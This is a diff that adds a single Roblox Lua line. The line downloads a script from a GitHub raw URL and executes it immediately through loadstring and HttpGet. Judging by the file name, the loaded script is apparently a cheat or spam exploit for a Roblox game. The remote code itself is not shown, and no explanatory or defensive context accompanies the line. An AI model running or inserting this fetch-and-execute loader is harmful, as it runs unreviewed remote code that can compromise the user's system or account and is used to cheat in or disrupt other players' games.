@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/cat-battles-spam3-msoxa30xoe32cc.lua"))()
